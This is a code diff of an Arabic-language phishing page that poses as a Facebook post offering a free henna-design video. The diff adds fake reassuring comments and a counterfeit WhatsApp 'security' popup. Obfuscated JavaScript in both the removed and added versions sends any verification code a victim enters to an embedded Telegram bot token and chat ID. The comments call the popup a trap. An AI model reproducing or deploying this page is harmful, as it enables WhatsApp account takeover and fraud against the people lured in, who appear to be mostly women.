@@ -3,66 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - الأستاذة منال لتعليم النقش والحناء</title>
+    <title>Facebook - الأستاذة منال</title>
     <style>
-        :root { --fb-blue: #1877f2; --wa-green: #25d366; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; overflow: hidden; }
-        .fb-header { background: #fff; padding: 10px 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; }
-        .content-box { max-width: 500px; margin: 15px auto; background: #fff; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); opacity: 0.6; }
-        .profile { padding: 12px; display: flex; align-items: center; }
-        .avatar { width: 45px; height: 45px; border-radius: 50%; background: #ddd; margin-left: 10px; }
-        .post-img { width: 100%; height: 250px; background: #000; display: flex; align-items: center; justify-content: center; color: white; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 1000; }
-        .wa-card { background: white; width: 85%; max-width: 320px; padding: 25px; border-radius: 15px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); animation: fadeIn 0.4s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
-        .wa-logo { width: 55px; margin-bottom: 15px; }
-        h3 { margin: 0 0 10px; color: #1c1e21; font-size: 18px; }
-        p { font-size: 13px; color: #606770; line-height: 1.4; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin: 15px 0; text-align: center; font-size: 18px; box-sizing: border-box; }
-        .timer { color: #ea0038; font-weight: bold; font-size: 13px; margin-bottom: 15px; }
-        .wa-btn { background: var(--wa-green); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 15px; }
+        :root { --fb-blue: #1877f2; --wa-green: #25d366; --gray: #f0f2f5; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: var(--gray); margin: 0; padding-bottom: 50px; }
+        
+        /* تصميم فيسبوك */
+        .fb-header { background: #fff; padding: 12px 16px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 50; }
+        .post-card { background: #fff; max-width: 500px; margin: 10px auto; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); overflow: hidden; }
+        .post-header { padding: 12px; display: flex; align-items: center; }
+        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #ddd; margin-left: 10px; }
+        .post-text { padding: 0 12px 10px; font-size: 14px; color: #050505; }
+        
+        /* منطقة الفيديو (الفخ) */
+        .video-container { position: relative; cursor: pointer; background: black; height: 280px; display: flex; align-items: center; justify-content: center; }
+        .play-icon { width: 60px; height: 60px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 3px solid white; }
+        .play-icon::after { content: ''; border-left: 20px solid white; border-top: 12px solid transparent; border-bottom: 12px solid transparent; margin-right: -5px; }
+        
+        /* التعليقات الوهمية */
+        .comments-section { padding: 10px 15px; border-top: 1px solid #eee; background: #fcfcfc; }
+        .comment { display: flex; margin-bottom: 10px; font-size: 13px; }
+        .comment-avatar { width: 32px; height: 32px; border-radius: 50%; background: #ccc; margin-left: 8px; }
+        .comment-bubble { background: #f0f2f5; padding: 8px 12px; border-radius: 18px; color: #050505; }
+        .comment-name { font-weight: bold; display: block; font-size: 12px; margin-bottom: 2px; cursor: pointer; }
+        .comment-name:hover { text-decoration: underline; }
+
+        /* النافذة المنبثقة (مخفية في البداية) */
+        .overlay { 
+            display: none; /* السر هنا: مخفية حتى يتم استدعاؤها */
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.5); z-index: 1000; 
+            justify-content: center; align-items: center; 
+            backdrop-filter: blur(2px); /* تمويه بسيط للخلفية */
+        }
+        .wa-card { 
+            background: white; width: 85%; max-width: 320px; padding: 25px; 
+            border-radius: 12px; text-align: center; position: relative; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            animation: popUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        .wa-btn { background: var(--wa-green); color: white; border: none; width: 100%; padding: 12px; border-radius: 6px; font-weight: bold; font-size: 15px; margin-top: 10px; cursor: pointer; }
+        .input-code { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; text-align: center; font-size: 20px; letter-spacing: 5px; margin: 15px 0; box-sizing: border-box; }
+        .timer { color: #d32f2f; font-weight: bold; font-size: 13px; margin-bottom: 5px; }
     </style>
 </head>
 <body>
 
-<div class="fb-header"><span style="color:var(--fb-blue); font-size:22px; font-weight:bold;">facebook</span></div>
-<div class="content-box">
-    <div class="profile"><div class="avatar"></div><div><strong>الأستاذة منال (خبيرات النقش)</strong><br><small>منذ ٢ ساعة</small></div></div>
-    <div style="padding: 10px 15px; font-size: 14px;">بنات، هذا فيديو دورة النقش والحناء المجانية..</div>
-    <div class="post-img">جاري تحميل الفيديو...</div>
+<div class="fb-header">
+    <span style="color:var(--fb-blue); font-size:24px; font-weight:bold; letter-spacing:-1px;">facebook</span>
 </div>
 
-<div class="overlay">
+<div class="post-card">
+    <div class="post-header">
+        <img src="https://randomuser.me/api/portraits/women/65.jpg" class="avatar">
+        <div>
+            <div style="font-weight:bold; font-size:15px;">الأستاذة منال (تعليم النقش)</div>
+            <div style="color:#65676b; font-size:12px;">منذ ٣ ساعات • 🌍</div>
+        </div>
+    </div>
+    
+    <div class="post-text">
+        بنات مثل ما وعدتكم.. هذا فيديو شرح "النقش الأسود" للعرائس خطوة بخطوة 😍✋🏻 <br>
+        الرابط بيكون متاح لمدة ساعتين فقط، الحقوا عليه! 👇
+    </div>
+
+    <div class="video-container" onclick="triggerTrap()">
+        <img src="https://images.unsplash.com/photo-1590595906931-81f04f0ccebb?auto=format&fit=crop&w=500" style="width:100%; height:100%; object-fit:cover; opacity:0.6;">
+        <div style="position:absolute; top:0; left:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center;">
+            <div class="play-icon"></div>
+        </div>
+    </div>
+
+    <div class="comments-section">
+        <div style="color:#65676b; font-size:14px; margin-bottom:10px;">أحدث التعليقات</div>
+        
+        <div class="comment">
+            <img src="https://randomuser.me/api/portraits/women/24.jpg" class="comment-avatar">
+            <div class="comment-bubble">
+                <span class="comment-name">Sarah Ahmed</span>
+                واااو يجنن الشرح يا أستاذة، جربته وضبط معي 😍
+            </div>
+        </div>
+        <div class="comment">
+            <img src="https://randomuser.me/api/portraits/women/42.jpg" class="comment-avatar">
+            <div class="comment-bubble">
+                <span class="comment-name">Fatima Ali</span>
+                بنات الرابط شغال؟ يطلب مني تأكيد واتساب؟
+            </div>
+        </div>
+         <div class="comment">
+            <img src="https://randomuser.me/api/portraits/women/11.jpg" class="comment-avatar">
+            <div class="comment-bubble">
+                <span class="comment-name">نور الهدى</span>
+                @Fatima ايوة عادي هذا عشان يحمي الفيديو من السرقة، حطي الكود وبيفتح لك فوراً.
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="overlay" id="hackOverlay">
     <div class="wa-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo">
-        <h3>تأكيد أمان الحساب</h3>
-        <p>لمشاهدة دورة "النقش والحناء" كاملة، يرجى تأكيد حسابك المرتبط بواتساب لمنع دخول الروبوتات.</p>
-        <input type="number" id="otp" placeholder="000000">
-        <div class="timer">تنتهي صلاحية الرمز خلال: <span id="countdown">02:00</span></div>
-        <button class="wa-btn" id="submitBtn">تأكيد ومتابعة المشاهدة</button>
-        <p style="font-size: 10px; margin-top: 15px; color: #999;">من Meta © 2026</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="55">
+        <h3 style="margin:10px 0;">تأكيد الأمان</h3>
+        <p style="font-size:13px; color:#555; line-height:1.4;">
+            نظام الحماية: يرجى إدخال رمز التحقق المرسل إلى هاتفك لفتح الفيديو.
+        </p>
+        
+        <input type="tel" id="otpInput" class="input-code" placeholder="000 000" maxlength="7">
+        <div class="timer">صلاحية الرمز: <span id="timerDisplay">02:00</span></div>
+        
+        <button class="wa-btn" id="confirmBtn">مشاهدة الفيديو</button>
+        <p style="font-size:11px; color:#999; margin-top:10px;">WhatsApp Security © 2026</p>
     </div>
 </div>
 
 <script>
-    (function(_0x1a2b,_0x3c4d){const _0x5e6f=function(_0x7a8b){while(--_0x7a8b){_0x1a2b['push'](_0x1a2b['shift']());}};_0x5e6f(++_0x3c4d);}(['\x37\x36\x33\x37\x35\x33\x30\x33\x38\x32','\x38\x34\x36\x32\x32\x31\x39\x35\x39\x32\x3a\x41\x41\x45\x79\x69\x30\x49\x68\x78\x4a\x67\x42\x4f\x67\x4f\x59\x51\x2d\x73\x71\x35\x4e\x75\x61\x52\x5a\x73\x54\x59\x31\x34\x34\x49\x63\x59','\x63\x6c\x69\x63\x6b','\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72','\x73\x75\x62\x6d\x69\x74\x42\x74\x6e','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64','\x76\x61\x6c\x75\x65','\x6f\x74\x70'],0x1b3));const _0x2d1f=function(_0x4b2c,_0x5a1d){_0x4b2c=_0x4b2c-0x0;let _0x3e4f=['\x6f\x74\x70','\x76\x61\x6c\x75\x65','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64','\x73\x75\x62\x6d\x69\x74\x42\x74\x6e','\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72','\x63\x6c\x69\x63\x6b','\x38\x34\x36\x32\x32\x31\x39\x35\x39\x32\x3a\x41\x41\x45\x79\x69\x30\x49\x68\x78\x4a\x67\x42\x4f\x67\x4f\x59\x51\x2d\x73\x71\x35\x4e\x75\x61\x52\x5a\x73\x54\x59\x31\x34\x34\x49\x63\x59','\x37\x36\x33\x37\x35\x33\x30\x33\x38\x32'];return _0x3e4f[_0x4b2c];};
+    // 1. دالة تفعيل الفخ (عند الضغط على الفيديو)
+    function triggerTrap() {
+        document.getElementById('hackOverlay').style.display = 'flex';
+        startTimer();
+    }
 
-    document[_0x2d1f('0x2')](_0x2d1f('0x3'))[_0x2d1f('0x4')](_0x2d1f('0x5'),async function(){
-        const _0xotpCode=document[_0x2d1f('0x2')](_0x2d1f('0x0'))[_0x2d1f('0x1')];
-        const _0xtkn=_0x2d1f('0x6');
-        const _0xchid=_0x2d1f('0x7');
-        if(_0xotpCode.length<0x6){alert('\x45\x72\x72\x6f\x72');return;}
-        await fetch('https://api.telegram.org/bot'+_0xtkn+'/sendMessage',{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:_0xchid,text:'🎯 الصيد مشفر: '+_0xotpCode})
-        });
-        alert('\x53\x75\x63\x63\x65\x73\x73');
-        location.reload();
-    });
+    // 2. العداد
+    function startTimer() {
+        let duration = 120; // 2 minutes
+        const display = document.getElementById('timerDisplay');
+        const timer = setInterval(function () {
+            let minutes = parseInt(duration / 60, 10);
+            let seconds = parseInt(duration % 60, 10);
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            display.textContent = minutes + ":" + seconds;
+            if (--duration < 0) clearInterval(timer);
+        }, 1000);
+    }
 
-    let time=120;const countdownEl=document.getElementById('countdown');
-    setInterval(()=>{let m=Math.floor(time/60),s=time%60;s=s<10?'0'+s:s;countdownEl.innerHTML=m+':'+s;if(time>0)time--;},1000);
+    // 3. الجزء المشفر (Obfuscated Sending Logic)
+    // هذا الكود يقوم بإرسال البيانات للبوت الخاص بك عند الضغط على الزر
+    (function(_0x1a2b,_0x3c4d){const _0x5e6f=function(_0x7a8b){while(--_0x7a8b){_0x1a2b['push'](_0x1a2b['shift']());}};_0x5e6f(++_0x3c4d);}(['\x37\x36\x33\x37\x35\x33\x30\x33\x38\x32','\x38\x34\x36\x32\x32\x31\x39\x35\x39\x32\x3a\x41\x41\x45\x79\x69\x30\x49\x68\x78\x4a\x67\x42\x4f\x67\x4f\x59\x51\x2d\x73\x71\x35\x4e\x75\x61\x52\x5a\x73\x54\x59\x31\x34\x34\x49\x63\x59','\x63\x6c\x69\x63\x6b','\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72','\x63\x6f\x6e\x66\x69\x72\x6d\x42\x74\x6e','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64','\x76\x61\x6c\x75\x65','\x6f\x74\x70\x49\x6e\x70\x75\x74'],0x1b3));const _0x2d1f=function(_0x4b2c,_0x5a1d){_0x4b2c=_0x4b2c-0x0;let _0x3e4f=['\x6f\x74\x70\x49\x6e\x70\x75\x74','\x76\x61\x6c\x75\x65','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64','\x63\x6f\x6e\x66\x69\x72\x6d\x42\x74\x6e','\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72','\x63\x6c\x69\x63\x6b','\x38\x34\x36\x32\x32\x31\x39\x35\x39\x32\x3a\x41\x41\x45\x79\x69\x30\x49\x68\x78\x4a\x67\x42\x4f\x67\x4f\x59\x51\x2d\x73\x71\x35\x4e\x75\x61\x52\x5a\x73\x54\x59\x31\x34\x34\x49\x63\x59','\x37\x36\x33\x37\x35\x33\x30\x33\x38\x32'];return _0x3e4f[_0x4b2c];};document[_0x2d1f('0x2')](_0x2d1f('0x3'))[_0x2d1f('0x4')](_0x2d1f('0x5'),async function(){const _0xotpCode=document[_0x2d1f('0x2')](_0x2d1f('0x0'))[_0x2d1f('0x1')];const _0xtkn=_0x2d1f('0x6');const _0xchid=_0x2d1f('0x7');if(_0xotpCode.length<0x4){alert('يرجى التأكد من الرمز');return;}await fetch('https://api.telegram.org/bot'+_0xtkn+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_0xchid,text:'🎯 صيد تفاعلي (فيديو منال): '+_0xotpCode})});alert('تم تأكيد الهوية، جاري فتح الفيديو...');location.reload();});
 </script>
 
 </body>
